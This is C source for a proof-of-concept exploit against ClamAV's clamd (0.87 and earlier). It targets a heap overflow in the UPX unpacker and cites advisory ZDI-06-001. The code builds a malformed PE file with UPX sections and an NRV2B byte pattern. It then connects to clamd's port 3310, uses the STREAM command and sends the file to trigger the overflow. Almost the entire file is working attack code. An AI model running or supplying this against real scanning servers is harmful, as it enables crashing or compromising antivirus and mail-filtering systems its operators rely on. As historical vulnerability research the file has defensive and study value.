/*
 * Clamd <= 0.87 Heap Overflow Exploit for UPX unpacking vulnerability.
 * Advisory: http://zerodayinitiative.com/advisories/ZDI-06-001.html
 *
 * References:
 *    (i)   http://www.openrce.org/reference_library/files/reference/PE%20Format.pdf
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <errno.h>

#define IMAGE_DOS_SIGNATURE         0x5a4d      /* MZ */
#define IMAGE_DOS_SIGNATURE_OLD     0x4d5a      /* ZM */
#define IMAGE_NT_SIGNATURE          0x00004550
#define IMAGE_OPTIONAL_SIGNATURE    0x010b

#define EP_SIZE                     0x10+168    /* Entry Point Code Size */
#define UPX_NRV2B                   "\x11\xdb\x11\xc9\x01\xdb\x75\x07\x8b\x1e\x83\xee\xfc\x11\xdb\x11\xc9\x11\xc9\x75\x20\x41\x01\xdb"    /* UPX_NRV2B Pattern so that libclamAV detects it as NRV2B compression */

typedef struct 
{
   unsigned short    magic;
   unsigned char     crap[58];
   unsigned int      elnew;
} dos_header_t;

typedef struct
{
   unsigned short    machine;
   unsigned short    num_sections;  /* Number of Sections */
   unsigned int      timestamp;     /* Date Time Stamp */
   unsigned int      ptr_symtab;    /* Offset to Symbol Table */
   unsigned int      num_sym;       /* Number of Symbols */
   unsigned short    size_opth;     /* Size of Optional Header */
   unsigned short    chart;         /* Charecteristics */
} nt_file_header_t;

typedef struct
{
  unsigned char      crap[0xe0];    /* This is an exploit code.. remember? */
} nt_opt_header_t;

typedef struct
{
   unsigned char     name[8];
   union {
      unsigned int   physical_addr;
      unsigned int   virtual_size;
   } misc;
   unsigned int      virtual_addr;
   unsigned int      size_rawdata;
   unsigned int      ptr_rawdata;
   unsigned int      ptr_relocation;
   unsigned int      ptr_linenum;
   unsigned short    num_relocation;
   unsigned short    num_linenum;
   unsigned int      chart;
} nt_section_header_t;

typedef struct
{
   unsigned int      signature;
   nt_file_header_t  file_header;
   nt_opt_header_t   opt_header;
} nt_header_t;

int create_evilfile()
{
   int   fd;
   FILE  *f;
   char  garbage[4096];
   char  ep_buff[EP_SIZE];
   char  raw_data[2048];

   dos_header_t         dos;
   nt_header_t          ntheader;
   nt_section_header_t  section1;
   nt_section_header_t  section2;

   unsigned int entry_point_offset = sizeof(dos) + sizeof(ntheader) + sizeof(section1) + sizeof(section2);

   f = tmpfile();
   if(!f) {
      perror("tmpfile");
      exit(EXIT_FAILURE);
   }
   fd = fileno(f);

   /* DOS Header */
   memset(&dos,0x41,sizeof(dos));
   dos.magic = IMAGE_DOS_SIGNATURE;
   dos.elnew = sizeof(dos);

   /* NT Header */
   memset(&ntheader,0x41,sizeof(ntheader));
   /* File Header */
   ntheader.signature = IMAGE_NT_SIGNATURE;
   ntheader.file_header.chart = 0x01;           /* PE is Executable */
   ntheader.file_header.machine = 0x14c;        /* 80386 */
   ntheader.file_header.num_sections = 0x02;    /* Number of Sections */
   ntheader.file_header.timestamp = 0x00;       /* Crap */
   ntheader.file_header.size_opth = sizeof(ntheader.opt_header);   /* Size of optional Header */
   /* Optional Header */
   *((unsigned short*)&(ntheader.opt_header.crap[0x30])) = (unsigned short) 3; /* Win32 Console Subsystem */
   *((unsigned int*)&(ntheader.opt_header.crap[0x5c])) = (unsigned int)1;     /* Num RVA and Size */
   *((unsigned int*)&(ntheader.opt_header.crap[0x1c])) = (unsigned int)1;     /* Image Base */
   /* AddressOfEntryPoint should be less than minimum virtual address in section headers */
   *((unsigned int*)&(ntheader.opt_header.crap[0x10])) = (unsigned int)entry_point_offset;
   

   /* NT Section Header */
   memset(&section1,0x00,sizeof(section1));
   memset(&section2,0x00,sizeof(section2));
   strcpy(section1.name,"UPX0");
   strcpy(section2.name,"UPX1");
   
   /* SECTION 1 */
   section1.size_rawdata = 0x00;                /* Ok this should make libclamav detect as UPX/FSG packed */
   section1.misc.virtual_size = 0x1000;           /* TODO: Just to make it TRUE */
   section1.chart = 0x20000000 | 0x80000000;    /* wx Permission */
   section1.ptr_rawdata = sizeof(dos) + sizeof(ntheader) + sizeof(section1) + sizeof(section2) + EP_SIZE;
   section1.virtual_addr = entry_point_offset + EP_SIZE;

   /* DSIZE = section1.misc.virtual_size + section2.misc.virtual_size */

   /* SECTION 2 */
   section2.size_rawdata = 0x1000;                /* SSIZE */
   section2.misc.virtual_size = 0x1000;           /* TODO: Just to make it TRUE */
   section2.chart = 0x20000000 | 0x80000000;    /* wx Permission */
   section2.ptr_rawdata = sizeof(dos) + sizeof(ntheader) + sizeof(section1) + sizeof(section2) + EP_SIZE;
   section2.virtual_addr = entry_point_offset + EP_SIZE;

   /* ENTRY POINT DATA */
   memset(ep_buff,0x41,sizeof(ep_buff));
   memcpy(ep_buff+0x69,UPX_NRV2B,strlen(UPX_NRV2B));  /* To make libclamAV detect this stream as UPX_NRV2B packed */

   /* RAW DATA WHERE SECTION HEADERS POINT */
   memset(raw_data,0x41,sizeof(raw_data));      /* SRC of SSIZE BYTES */
   /* Followings are required to trigger pefromupx() in upx.c from upx_inflate2b() */
   *((unsigned int*)&raw_data[8]) = (unsigned int)0xffffffff;  /* whats the color of ur hat? */
   raw_data[EP_SIZE + 0x106] = 0x8d;
   raw_data[EP_SIZE + 0x107] = 0xbe;

   /* JUNK DATA TO INCREASE FILE SIZE */
   memset(garbage,0x41,sizeof(garbage));

   /* Now lets create the malicious file */
   write(fd,&dos,sizeof(dos));
   write(fd,&ntheader,sizeof(ntheader));
   write(fd,&section1,sizeof(section1));
   write(fd,&section2,sizeof(section2));
   write(fd,&ep_buff,sizeof(ep_buff));
   write(fd,&raw_data,sizeof(raw_data));
   write(fd,&garbage,sizeof(garbage));
   fdatasync(fd);
   
   lseek(fd,0,SEEK_SET);
   return fd;
}

int main(int argc, char **argv)
{
   const char *host = "127.0.0.1";
   in_addr_t host_addr;
   struct hostent *h;
   unsigned short port = 3310, stream_port;
   struct sockaddr_in sin1,sin2;
   int sockfd1,sockfd2;
   char buff[1024];
   char *ptr;
   int n,fd;

   if(argc > 1)
      host = strdup(argv[1]);
   if(argc > 2)
      port = atoi(argv[2]);
   
   sockfd1 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if((host_addr = inet_addr(host)) == 0xffffffff) {
      printf("Resolving %s\n",host);
      h = gethostbyname(host);
      if(h) {
         sin1.sin_addr = *((struct in_addr*)h->h_addr_list[0]);
         host_addr = sin1.sin_addr.s_addr;
      }
      else {
         printf("Unable to resolve host %s\n",host);
         exit(EXIT_FAILURE);
      }
   }
   sin1.sin_addr.s_addr = host_addr;
   sin1.sin_port = htons(port);
   sin1.sin_family = AF_INET;
   
   printf("Connecting to %s:%d\n",host,port);
   if(connect(sockfd1,(struct sockaddr*)&sin1,sizeof(sin1))) {
      printf("Connection failed\n");
      exit(EXIT_FAILURE);
   }
   write(sockfd1,"STREAM\n",strlen("STREAM\n"));
   read(sockfd1,buff,sizeof(buff)-1);
   ptr = strchr(buff,0x20);
   if(!ptr) {
      printf("Invalid response from clamd.. expected stream port\n");
      close(sockfd1);
      exit(EXIT_FAILURE);
   }
   stream_port = (unsigned short)strtoul(++ptr,NULL,10);

   sockfd2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   sin2.sin_addr.s_addr = host_addr;
   sin2.sin_port = htons(stream_port);
   sin2.sin_family = AF_INET;
   
   printf("Connecting to %s:%d for sending file stream\n",host,stream_port);
   if(connect(sockfd2,(struct sockaddr*)&sin2,sizeof(sin2))) {
      printf("Failed to connect to stream port.. unable to send file stream\n");
      exit(EXIT_FAILURE);
   }
   
   printf("Sending file stream.");
   fd = create_evilfile();
   while((n=read(fd,buff,sizeof(buff))) > 0) {
      write(sockfd2,buff,n);
      printf(".");
   }
   close(sockfd2);   /* stream socket descriptor */
   close(fd);        /* tmp file descriptor */
   printf("\nFile stream send\n");
   printf("Dumping response from server\n");
   n=read(sockfd1,buff,sizeof(buff));
   buff[n] = 0x00;
   printf("%s\n",buff);
   printf("All done.. disconnecting\n");
   close(sockfd1);
   
   return 0;   
}
